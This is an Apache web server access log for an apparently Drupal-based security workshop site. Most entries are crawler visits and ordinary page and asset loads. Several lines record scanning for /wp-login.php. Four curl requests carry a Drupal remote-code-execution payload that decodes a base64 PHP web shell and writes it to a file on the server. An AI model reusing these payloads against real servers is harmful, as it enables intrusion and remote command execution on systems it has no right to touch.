220.181.125.142 - - [30/Apr/2018:11:28:20 -0400] "GET /papers/2006/nspw2006-gutmann.pdf HTTP/1.1" 304 3665 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
47.31.130.79 - - [30/Apr/2018:11:28:22 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
47.31.130.79 - - [30/Apr/2018:11:28:23 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
220.181.125.142 - - [30/Apr/2018:11:28:29 -0400] "GET /papers/2005/nspw2005-van_oorschot.pdf HTTP/1.1" 304 3666 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /2018/cfp HTTP/1.1" 200 8167 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 4434 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 3914 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 4155 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 4994 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 4008 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:49 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:50 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:50 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:50 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:50 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:50 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:50 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:50 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:50 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:50 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
144.82.8.44 - - [30/Apr/2018:11:29:53 -0400] "GET /2018/dates HTTP/1.1" 200 2878 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET / HTTP/1.1" 200 6424 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1167 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1727 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 888 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 741 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 647 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:57 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:58 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:58 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:58 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:58 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:58 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:58 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:58 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:58 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:58 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:29:58 -0400] "GET /favicon.ico HTTP/1.1" 404 3914 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
128.16.5.5 - - [30/Apr/2018:11:30:01 -0400] "GET /2018/dates HTTP/1.1" 200 2877 "https://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
69.162.124.227 - - [30/Apr/2018:11:30:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
86.126.206.140 - - [30/Apr/2018:11:30:37 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6182 "-" "curl/7.47.0"
86.126.206.140 - - [30/Apr/2018:11:30:37 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6181 "-" "curl/7.47.0"
14.1.227.15 - - [30/Apr/2018:11:31:01 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
14.1.227.15 - - [30/Apr/2018:11:31:02 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.113 - - [30/Apr/2018:11:31:18 -0400] "GET /papers/2013/nspw2013-durmuth.pdf HTTP/1.1" 200 452148 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [30/Apr/2018:11:31:47 -0400] "GET /papers/2005/nspw2005-thorpe.pdf HTTP/1.1" 200 3949092 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:11:32:03 -0400] "GET /papers/1993/nspw1993-denning.pdf HTTP/1.1" 200 636354 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:11:32:59 -0400] "GET /2009/proceedings/1996/?C=D;O=A HTTP/1.1" 200 4427 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.15 - - [30/Apr/2018:11:33:04 -0400] "GET /papers/?C=N;O=D HTTP/1.1" 403 3907 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.87 - - [30/Apr/2018:11:33:55 -0400] "GET /modules/system/system.base.css?nhfa6e HTTP/1.1" 200 5701 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:11:33:55 -0400] "GET /modules/field/theme/field.css?nhfa6e HTTP/1.1" 200 3993 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:11:33:55 -0400] "GET /modules/node/node.css?nhfa6e HTTP/1.1" 200 472 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:11:33:56 -0400] "GET /modules/system/system.menus.css?nhfa6e HTTP/1.1" 200 1025 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:11:33:56 -0400] "GET /modules/system/system.theme.css?nhfa6e HTTP/1.1" 200 1585 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:11:33:57 -0400] "GET /themes/garland/style.css?nhfa6e HTTP/1.1" 200 5370 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:11:33:57 -0400] "GET /modules/comment/comment.css?nhfa6e HTTP/1.1" 200 505 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:11:33:58 -0400] "GET /themes/garland/print.css?nhfa6e HTTP/1.1" 200 771 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:11:35:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
37.47.166.212 - - [30/Apr/2018:11:35:50 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.47.166.212 - - [30/Apr/2018:11:35:50 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [30/Apr/2018:11:36:20 -0400] "GET / HTTP/1.1" 200 6608 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:11:36:24 -0400] "GET /2004/oc.content HTTP/1.1" 200 6193 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:11:36:52 -0400] "GET /2002/oc.shtml HTTP/1.1" 200 5431 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
207.46.13.54 - - [30/Apr/2018:11:37:28 -0400] "GET /papers/2002/nspw2002-toyoizumi.pdf HTTP/1.1" 200 531389 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
93.160.60.22 - - [30/Apr/2018:11:39:46 -0400] "GET /papers/2011/nspw2011%E2%80%90feigenbaum.pdf HTTP/1.1" 404 8260 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com"
69.162.124.227 - - [30/Apr/2018:11:40:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:11:40:54 -0400] "GET /papers/2000/nspw2000-mcdermott.pdf HTTP/1.1" 200 378051 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
110.39.188.110 - - [30/Apr/2018:11:41:23 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
110.39.188.110 - - [30/Apr/2018:11:41:23 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:11:45:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.235.201.92 - - [30/Apr/2018:11:45:24 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.235.201.92 - - [30/Apr/2018:11:45:27 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [30/Apr/2018:11:45:27 -0400] "GET /2005/local.shtml HTTP/1.1" 200 4964 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
59.124.153.166 - - [30/Apr/2018:11:45:36 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6213 "-" "curl/7.47.0"
59.124.153.166 - - [30/Apr/2018:11:45:37 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6212 "-" "curl/7.47.0"
180.23.174.51 - - [30/Apr/2018:11:46:37 -0400] "GET /2018 HTTP/1.1" 200 12606 "-" "LWP::Simple/6.29 libwww-perl/6.29"
103.66.79.170 - - [30/Apr/2018:11:47:21 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.66.79.170 - - [30/Apr/2018:11:47:24 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
40.77.167.129 - - [30/Apr/2018:11:49:07 -0400] "GET /papers/2005/nspw2005-probst.pdf HTTP/1.1" 200 2423356 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [30/Apr/2018:11:50:00 -0400] "GET /papers/2001/nspw2001-du.pdf HTTP/1.1" 200 914427 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:11:50:09 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
103.218.246.236 - - [30/Apr/2018:11:50:53 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.218.246.236 - - [30/Apr/2018:11:50:56 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [30/Apr/2018:11:51:06 -0400] "GET /papers/1999/nspw1999-timmerman.pdf HTTP/1.1" 200 871296 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
178.220.126.157 - - [30/Apr/2018:11:51:56 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.220.126.157 - - [30/Apr/2018:11:51:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.102.6.201 - - [30/Apr/2018:11:52:02 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 200 2771026 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.249.73.89 - - [30/Apr/2018:11:52:06 -0400] "GET / HTTP/1.1" 200 6606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
36.75.168.106 - - [30/Apr/2018:11:52:11 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
36.75.168.106 - - [30/Apr/2018:11:52:16 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.206.137.40 - - [30/Apr/2018:11:52:39 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
